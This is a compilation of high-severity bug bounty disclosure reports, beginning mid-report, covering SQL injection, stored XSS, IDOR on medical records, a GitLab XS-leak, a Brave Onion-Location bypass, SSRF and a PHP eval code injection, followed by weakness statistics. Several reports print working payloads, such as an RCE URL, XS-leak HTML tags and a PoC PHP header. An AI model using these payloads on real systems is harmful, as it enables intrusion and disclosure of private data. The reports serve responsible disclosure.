10470.				$sql[] = "m.groupid IN (" . implode(", ", $groups) . ")";
11471.			}
This can be exploited by remote attackers to e.g. read sensitive data from the "users" database table through boolean-based SQL Injection attacks.
ImpressCMS branch :
The vulnerability has been tested and confirmed on ImpressCMS version 1.4.2 (the latest at the time of writing).
Steps To Reproduce:
Use the attached Proof of Concept (PoC) script to reproduce this vulnerability. It's a PHP script supposed to be used from the command-line (CLI). You should see an output like the following:
Code 147 Bytes
1$ php sqli.php http://localhost/impresscms/
2[-] Retrieving security token...
3[-] Starting SQL Injection attack...
4[-] Admin's email: admin@test.com
The PoC leverages both this vulnerability and the one reported at #1081137 to achieve unauthenticated exploitation.
Impact
This vulnerability might allow unauthenticated attackers to disclose any field of the "users" database table, including the users' email addresses and password hashes, potentially leading to full account takeovers.
NOTE: normally, successful exploitation of this vulnerability should require an admin user session. However, due to the vulnerability described in report #1081137, this could be exploited by unauthenticated attackers as well.



==================================================

Report File: 1081994.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Summary:
Stored XSS exists at https://www.██████.mil. A user can fill out the form and upload a file containing javascript code to trigger XSS.
Description:
Stored XSS exists at https://www.████.mil. A user can fill out the form and upload a file containing javascript code to trigger XSS.
Impact
A user can steal cookies, deface a site, etc.
Step-by-step Reproduction Instructions
(1) Go to https://www.██████.mil/jppso/vendor/WFDPMMiscInvoicingDocuments.aspx
(2) Fill out the form, upload a file, and add the file
(3) Once the file is uploaded right click to get to the Developer Tools.
(4) Inspect the page and find the path for the file -- █████\file.txt. For example, the file path for the file I uploaded is as follows: https://www.██████.mil/jppso/vendor/Data/cme1rjjcnjhnvdzhf5lgfbge-01192021-065856_testing-new.html
(5) Observe that XSS is triggered.
Product, Version, and Configuration (If applicable)
https://www.████████.mil
Tested in Firefox
Suggested Mitigation/Remediation Actions
Impact
Stored XSS exists at https://www.█████.mil. A user can fill out the form and upload a file containing javascript code to trigger XSS.



==================================================

Report File: 1085782.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Insecure Direct Object Reference (IDOR)

Contents:

Summary:
████ is designed in a way where there is a vulnerable endpoint that allows a non-medical user to view the ██████████ records of people who are not ████████s of the sponsor.
Description:
I am currently an Active Duty Airman and this vulnerability does require CAC authentication. When browsing the ██████ website with a proxy I noticed that there is a function that allows sponsors (in this case me) to view their █████s shot records in PDF form. After viewing my ██████████'s shot records, I noticed this functionality lives on the following endpoint https://████=[id]. If you increment or decrement the ██████ parameter by 1 the application will throw an HTTP Status Code 302 and redirect you back to the ██████████ endpoint which is a good security practice. The issue with this is, that with the 302 redirect the PDF of the incremented ID will be attached in the body of the 302 requests, you are able to extract this when using a proxy like Burp Suite. Obviously, this is concerning because this would allow a user to pull any shot record without being associated with medical.
Step-by-step Reproduction Instructions
I have redacted the screenshots as best as possible. The screenshots are of my information, the example for validation.
Navigate to ████/█████ and login with CAC
Once you are authenticated browse to this endpoint, https://███████=█████████ and you should be redirected to █████ but the 302 redirect will have the PDF information of my daughter (no actual ██████████ information is loaded).
On the 302 redirects, you can utilize the function Copy to File in burp suite to save this request as a pdf and you will have a PDF version of my ██████ shot record.
Please review the attached screenshot, I did not pull use my █████ information for this screenshot because I have authorized to view her information. This request shows me decrementing the ██████ by 1 and showing the PDF is attached to the 302 redirects.
██████
Suggested Mitigation/Remediation Actions
Enforce the same permissions that are used for the ██████████ and ████ functions of the application.
I am more than willing to speak with the developers about this if they want to e-mail my NIPR email. I took care to not go any further than just validating that the vulnerability exists and immediately stopped and started to write this report.
Impact
PHI/PII disclosure which includes, ████████



==================================================

Report File: 1089914.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Privacy Violation

Contents:

Greetings,
I am Mojtaba Zaheri, a doctoral candidate in Computer Science, affiliated with the NJIT Cybersecurity Research Center. Together with my doctoral dissertation advisor, Prof. Reza Curtmola, we are reaching out to perform responsible disclosure of a vulnerability present on the GitLab website. Please let us know if you have any comments regarding this disclosure.
Summary:
We have identified a leaky resource attack against several high-profile resource-sharing websites, including GitLab, that allows an attacker to infer the unique identity of a victim that visits an attacker-controlled website. This targeted privacy attack can have a significant impact on the privacy of individuals.
Even though previous work introduced the attack using images (i.e., leaky images [1]), in this report we show that the attack works with any resource that can be privately shared with the victim and can be rendered on a webpage. In particular, we show the attack also works with other media files, such as video and audio files. Thus, we generically refer to the attack as a leaky resource attack. An attacker exploiting these vulnerabilities can identify a user of the GitLab website while the user visits an attacker-controlled website, using the cookie(s) set by the GitLab website in her browser.
The leaky image attack [1] leverages the existence of a state-dependent URL (SD-URL) on the image-sharing website, i.e. a URL for which the response is different depending on the victim’s state with respect to the image-sharing website. For example, if the user is the targeted victim, the content will be loaded, otherwise, it will not be loaded. The attacker can learn information about this response based on an XS-leak that bypasses the Same-Origin Policy which normally prevents the attacker from reading the contents of a cross-origin response. [1] describes script-based and scriptless variants of the leaky image attack. The scriptless variant relies on the object HTML tag for the XS-leak, using this tag’s if-then-else behavior to enable the attack.
We reveal a new SD-URL for resources in the GitLab service and introduce two new HTML-only XS-Leaks. We show that a leaky resource attack can be performed using video and audio HTML tags. The previously known scriptless attack was based on the object HTML tag, but we find that it is not reliable: It does not work against all vulnerable resource-sharing services and only works in some browsers. As opposed to this, we show that attacks based on the video and audio tags are very reliable, as they work against all the vulnerable services we identified and across all browsers we tested with (Firefox, Edge, Chrome).
We describe below the threat model, the exploit vector, and the actual steps that need to be followed on your website to set up a leaky resource attack. We also explain potential fixes.
Threat Model:
We consider attackers that can bring together the following necessary ingredients for a successful leaky resource attack:
The attacker and the victim are users of the same resource sharing service.
The resource sharing service allows its users to share resources privately with each other and authenticates users through cookies.
The attacker convinces the victim to visit the attack page (which is controlled by the attacker) while the victim is logged into her account with the resource sharing service (which is not controlled by the attacker).
The attacker can determine if the victim loaded the resources successfully.
The attack is effective because these requirements can be achieved in multiple ways and are within easy reach of the attacker. For requirement #1, GitLab is popular, so the victim may have an account; also, GitLab has free membership, and so the attacker can just create an account. For requirement #2, these are the de facto mechanisms for many of the resource sharing services. Requirement #3 can be achieved in multiple ways, including via phishing emails, or via a watering-hole approach. It is common for a large portion of internet users to be logged in to GitLab when they are surfing the internet. Requirement #4 is crucial for the attack and can be achieved as follows. The attack page contains a state-dependent URL (SD-URL) that points to content on the target website (i.e., GitLab). When a user makes a request for the SD-URL, the response is different depending on the user's state with respect to the GitLab website. For example, if the user is the targeted victim, the content will be loaded, otherwise, it will not be loaded. The attacker can learn information about this response based on an XS-leak that bypasses the Same-Origin Policy which normally prevents the attacker from reading the contents of a cross-origin response.
Attacks:
The new SD-URL we use can be exploited by a script-based XL-leak, but here we focus on scriptless XS-leaks, as privacy-aware users may disable scripts or use protection mechanisms that prevent script-based XS-leaks.
The pattern of the SD-URL used is:
Code 70 Bytes
1https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}
This SD-URL is valid until the resource is unshared or deleted.
Exploiting this SD-URL based on object tag HTML-only XS-Leak from [1]:
Code 185 Bytes
1<object data ="https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}" type ="image/png">
2             <object data ="Fallback-URL" type ="image/png"></object>
3</object>
Communication method using the object HTML tag: If the outer object element (SD-URL) fails to load, then the fallback is to load the inner object element (Fallback-URL, controlled by the attacker). This fallback-based mechanism can be used to simulate an if-then-else control flow instruction in pure HTML. The attack does not work with browsers we tested (Chrome 87.0, Edge 87.0, and Firefox 83.0).
Here we describe the video and audio HTML tags as new XS-leaks that are reliable across all browsers we tested (Chrome 87.0, Edge 87.0, and Firefox 83.0).
Code 233 Bytes
1<video width="320" height="240" controls autoplay muted>
2        <source src="https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}" type ="video/webm">
3        <source src="Fallback-URL" type ="video/webm">
4</video>
Communication Method using video HTML tag: If the first source (SD-URL) cannot be loaded, then the fallback is to load the second source (Fallback-URL, controlled by the attacker).
Code 227 Bytes
1<audio width="320" height="240" controls autoplay>
2         <source src="https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}" type ="audio/ogg">
3         <source src="Fallback-URL" type ="audio/ogg">
4</audio>
Communication Method using audio HTML tag: If the first source (SD-URL) cannot be loaded, then the fallback is to load the second source (Fallback-URL, controlled by the attacker).
Normally, the source elements are used by website authors to specify multiple alternative media resources for media elements. However, these alternatives can be used to trigger a fallback behavior that mimics an if-then-else control flow. Both resources used in these tests have the type webm and ogg for video and audio tags respectively, but other video and audio file types can be used as well. By checking the HTTP Request Headers, the attacker can make sure whether the specific file type is supported by the browser, and so prepare an appropriate webpage.
Steps to Reproduce:
The attacker first shares privately a resource with the target victim using a sharing service. The attacker then embeds a link to the privately shared resource on a webpage she controls. When a visitor loads that webpage, the resource will be successfully retrieved only if the visitor is the targeted victim, since only the victim is allowed to retrieve the resource (assuming the victim's browser is logged into the sharing service). By observing the success of loading the resource through an XS-leak, the attacker will know if the intended victim has visited the attacker's website.
1) Upload and share privately the resource with the victim in GitLab.
2) Open the resource in the browser to get the SD-URL.
3) Embed the SD-URL in an attacker-controlled webpage with an XS-leak.
Fix:
Server-side defense:
The SameSite cookie attribute can be used to impose restrictions when cookies can be sent. Although setting this cookie attribute to strict or lax could limit the attack surface in theory, our findings show that many popular sharing services are still vulnerable, because the attribute is either set to none or not enabled at all. A major reason for this is that the SameSite cookie attribute interferes with services provided by websites. Two examples are a watch later button on a YouTube video embedded in a non-YouTube website, and a website that embeds the GoogleMaps service, in order to show user-specific resources, such as saved and favorite locations on the map. As an additional drawback, when the SameSite attribute is not set, browsers have inconsistent default behaviors. Chromium-based browsers versions 80 and above treat cookies as if a lax SameSite attribute is set, whereas Firefox (tested up to version 83) treats them as if SameSite is set to none.
Client-side defense:
We have devised a client-side defense that can be implemented as a browser extension and can thus be deployed immediately without buy-in from websites and browser vendors. The defense is included in a research article that is currently under submission for publication at an academic conference.
References:
[1] Staicu, C.A., Pradel, M.: Leaky images: Targeted privacy attacks in the web. In: Proc. of the 28th USENIX Security Symposium. pp. 923-939 (2019)
Impact
The leaky resource attack is a targeted privacy attack, in which an individual browsing an attacker-controlled webpage can be uniquely identified. This is in contrast with other known de-anonymization techniques, such as third-party tracking (e.g., tracking pixels or tracking IPs) or social media fingerprinting, that do not provide this level of accuracy. As such, leaky resources can be abused in a variety of privacy-sensitive scenarios, including law enforcement gathering evidence regarding the online activity of individuals, oppressive governments tracking political dissidents, de-anonymizing reviewers for a conference paper, blackmailing individuals based on their online activity, or health insurance companies discriminating individuals based on their online activity.



==================================================

Report File: 1089995.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Violation of Secure Design Principles

Contents:

Summary:
This PR introduced "Open in Tor" feature that can open .onion URLs offered through Onion-Location response header, but Onion-Location header allows to open arbitrary URLs such as javascript: and chrome:.
This behavior can be exploited as a way to bypass SOP and gain access to privileged URLs.
Products affected:
Brave Nightly for OSX (1.21.28 Chromium: 88.0.4324.96 (Official Build) nightly (x86_64))
Steps To Reproduce:
Open https://csrf.jp/brave/onion.php
Click "Open in Tor" button shown in the Brave's address bar
Privileged URL chrome://restart/ is opened, and Brave is restarted.
If a user enabled "Automatically redirect .onion sites" in the settings, chrome://restart/ is opened automatically and Brave continues to restart endlessly.
Supporting Material/References:
PoC code in PHP is below
Code 53 Bytes
1<?php
2header("Onion-Location: chrome://restart/");
3?>
Impact
As written in the summary, attacker can bypass SOP restrictions and gain access to privileged URLs.



==================================================

Report File: 1092230.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Server-Side Request Forgery (SSRF)

Contents:

Summary:
Hi Team, a bit of a odd one here. The FogBugz import code uses CarrierWave::Uploader::Base:download! to download attachments from fogbugz.com when importing a FogBugz repository. CarrierWave::Uploader::Base:download! ultimately uses Kernel.Open to download the provided attachment URL. Kernel.Open permits URLs which resolve to, or redirect to 127.0.0.1, making it vulnerable to SSRF issues. There is a check within the FogBugz import code which requires attachments to be downloaded with an http or https scheme from a fogbugz.dom subdomain:
app/services/projects/download_service.rb
Code 314 Bytes
1   
2WHITELIST = [
3  /^[^.]+\.fogbugz.com$/
4].freeze
5
6...
7    
8def valid_url?(url)
9  url && http?(url) && valid_domain?(url)
10end
11
12def http?(url)
13  url =~ /\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\z/
14end
15
16def valid_domain?(url)
17  host = URI.parse(url).host
18  WHITELIST.any? { |entry| entry === host }
19end
If a vulnerability can be identified in a fogbugz.com subdomain which results in returning a crafted API response including an arbitrary attachment URL, a full read GET based SSRF would be exploitable on gitlab.com (or a gitlab instance). I've done some basic analysis on potential vulnerabilities which could trigger this issue, they include (but are by no means limited to):
URL parameter clobbering to force a 302 redirect on attachment download
Intercept and modify an unencrypted HTTP API response
Subdomain takeover / dangling sub domain to return an arbitrary API response
HTTP Request smuggling to modify an in-flight API response
Cache poisoning to poison a malicious API response
SQL Injection to replace an attachment URL
Code Execution to modify api.asp to return an arbitrary API response
Social engineering / malicious insider FogBugz employee
Due to the third party nature of these issues it is not feasible to probe for, or disclose the potential existence of, any of these potential issues on fogbugz.com to GitLab. However, if any one of these issues exists now or in the future it would render gitlab.com vulnerable.
Steps to reproduce:
This issue can be simulated by placing an /etc/hosts entry on a GitLab server as follows:
Code 31 Bytes
1198.211.125.160 poc.fogbugz.com
This will point poc.fogbugz.com to a VPS I control, which responds with a crafted FogBugz API response designed to simulate the exploitation of a bug on a fogbugz.com domain. Importing the SSRF Repository FogBugz repository from this host will create a repository with a single issue which includes the SSRF result of requesting http://127.0.0.1:9090/api/v1/targets.
<image_0>
Impact:
A vulnerability in a fogbugz.com subdomain, which meets the above criteria, would result in a full GET based SSRF issue against gitlab.com.
What is the current bug behavior?
FogBugz import code uses Kernel.Open to download and store the result of an untrusted URL.
What is the expected correct behavior?
GitLab::Http should be used to download attachments to prevent SSRF attacks.
Output of checks:
Results of GitLab environment info
Code 970 Bytes
1System information
2System:         Ubuntu 20.04
3Proxy:          no
4Current User:   git
5Using RVM:      no
6Ruby Version:   2.7.2p137
7Gem Version:    3.1.4
8Bundler Version:2.1.4
9Rake Version:   13.0.3
10Redis Version:  5.0.9
11Git Version:    2.29.0
12Sidekiq Version:5.2.9
13Go Version:     unknown
14
15GitLab information
16Version:        13.8.1-ee
17Revision:       e10a21e66ce
18Directory:      /opt/gitlab/embedded/service/gitlab-rails
19DB Adapter:     PostgreSQL
20DB Version:     12.4
21URL:            http://188.166.97.195
22HTTP Clone URL: http://188.166.97.195/some-group/some-project.git
23SSH Clone URL:  git@188.166.97.195:some-group/some-project.git
24Elasticsearch:  no
25Geo:            no
26Using LDAP:     no
27Using Omniauth: yes
28Omniauth Providers:
29
30GitLab Shell
31Version:        13.15.0
32Repository storage paths:
33- default:      /var/opt/gitlab/git-data/repositories
34GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
35Git:            /opt/gitlab/embedded/bin/git
Impact
A vulnerability in a fogbugz.com subdomain, which meets the above criteria, would result in a full GET based SSRF issue against gitlab.com.



==================================================

Report File: 1092574.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Code Injection

Contents:

Summary:
The vulnerability exists because the IPS\cms\modules\front\pages\_builder::previewBlock() method allows to pass arbitrary content to the IPS\_Theme::runProcessFunction() method, which will be used in a call to the eval() function. This can be exploited to inject and execute arbitrary PHP code.
Steps To Reproduce:
Login as an user with permission to manage the sidebar
Browse to the following URL:
Code 224 Bytes
1http://[host]/[ips]/index.php?app=cms&module=pages&controller=builder&do=previewBlock&block_plugin=stats&block_template_use_how=copy&block_plugin_app=core&_sending=block_content&block_content=RCE%0ACONTENT;}}phpinfo();die;/*
This will result in the following PHP code to be passed to the eval() function from the IPS\_Theme::runProcessFunction() method:
Code 185 Bytes
1namespace IPS\Theme;
2class class_content_template_for_block_
3{
4	function run(  ) {
5		$return = '';
6		$return .= <<<CONTENT
7
8RCE
9CONTENT;}}phpinfo();die;/*
10CONTENT;
11
12		return $return;
13}}
As a result, the phpinfo() function will be executed
Impact
A malicious user might be able to inject and execute arbitrary PHP code. Successful exploitation of this vulnerability requires an account with permission to manage the sidebar (such as a Moderator or Administrator) and the "cms" application to be enabled.



==================================================

Report File: 1095830.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

hi team ,
i found that aem is running on████████ and CRXDE Lite/CRX is exposed to unauthenticated user that can lead to information disclosure
POC
1-visit https://██████//██████████
2-go to query and search for admin then execute
3-go to this endpoint to retrieve the information
Code 30 Bytes
1https://████████//████████/███
[+]Request
Code 646 Bytes
1GET //███/███ HTTP/1.1
2Host: ████
3Connection: close
4sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
5sec-ch-ua-mobile: ?0
6Upgrade-Insecure-Requests: 1
7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
9Sec-Fetch-Site: none
10Sec-Fetch-Mode: navigate
11Sec-Fetch-User: ?1
12Sec-Fetch-Dest: document
13Accept-Encoding: gzip, deflate
14Accept-Language: en-US,en-XA;q=0.9,en;q=0.8
15Cookie: oauth-configid=██████
16
17
[+]Response
Code 416 Bytes
1HTTP/1.1 200 OK
2Date: Thu, 04 Feb 2021 22:23:42 GMT
3X-Content-Type-Options: nosniff
4X-Frame-Options: SAMEORIGIN
5Content-Type: application/json;charset=utf-8
6Content-Length: 1789
7Connection: close
8Set-Cookie: ███████; path=/; Httponly; Secure
9Strict-Transport-Security: max-age=31536000; includeSubDomains
10Set-Cookie: f5avraaaaaaaaaaaaaaaa_session_=█████████; HttpOnly; secure
11Set-Cookie: █████████; Path=/
12
13████████
14
█████████
Impact
PII exposure
System Host(s)
██████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
1-visit https://████████//█████████
2-go to query and search for admin then execute
3-go to this endpoint to retrieve the information
Code 27 Bytes
1https://█████//███████/████
Suggested Mitigation/Remediation Actions



==================================================

Report File: 1096560.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Insecure Direct Object Reference (IDOR)

Contents:

Summary:
Hi team,
I discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR
Description:
It's possible to perform a IDOR attacker on getrevue.cowhen adding a image to your issue it's also possible to add descriptions and more to other people's issue
Steps To Reproduce:
Go to getrevue.co and Sign In
Click on Issues then Click on Add new issue
Go to the Issue that you created and from the bottom of the page Click on Media
Turn on the Intercept and Upload image
On the request change the ID to your other account's issue ID
Request:
Code 1.09 KiB
1POST /app/items HTTP/1.1
2Host: www.getrevue.co
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Referer: https://www.getrevue.co/app/issues/current
8X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==
9Content-Type: application/json
10X-Requested-With: XMLHttpRequest
11Content-Length: 519
12Origin: https://www.getrevue.co
13Connection: close
14Cookie: [YOUR_COOKIE]
15
<image_0>
POC video:
Impact
Ability to add arbitrary images/descriptions/titles to other people's issues
It's possible to hijack other people's issues



==================================================


WEAKNESS STATISTICS FOR HIGH SEVERITY WEB APP REPORTS
==================================================

None: 13 occurrence(s)
Information Disclosure: 11 occurrence(s)
Cross-site Scripting (XSS) - Stored: 9 occurrence(s)
SQL Injection: 9 occurrence(s)
Improper Access Control - Generic: 7 occurrence(s)
Insecure Direct Object Reference (IDOR): 5 occurrence(s)
Code Injection: 5 occurrence(s)
Server-Side Request Forgery (SSRF): 5 occurrence(s)
Business Logic Errors: 4 occurrence(s)
Improper Restriction of Authentication Attempts: 4 occurrence(s)
Improper Authentication - Generic: 3 occurrence(s)
Path Traversal: 3 occurrence(s)
Uncontrolled Resource Consumption: 3 occurrence(s)
Command Injection - Generic: 3 occurrence(s)
Cross-site Scripting (XSS) - DOM: 2 occurrence(s)
Cross-Site Request Forgery (CSRF): 2 occurrence(s)
Violation of Secure Design Principles: 2 occurrence(s)
Cross-site Scripting (XSS) - Reflected: 2 occurrence(s)
Privacy Violation: 2 occurrence(s)
Cleartext Storage of Sensitive Information: 1 occurrence(s)
Privilege Escalation: 1 occurrence(s)
Phishing: 1 occurrence(s)
Unverified Password Change: 1 occurrence(s)
Insufficiently Protected Credentials: 1 occurrence(s)
Authentication Bypass Using an Alternate Path or Channel: 1 occurrence(s)
Buffer Over-read: 1 occurrence(s)
Cross-site Scripting (XSS) - Generic: 1 occurrence(s)
Remote File Inclusion: 1 occurrence(s)
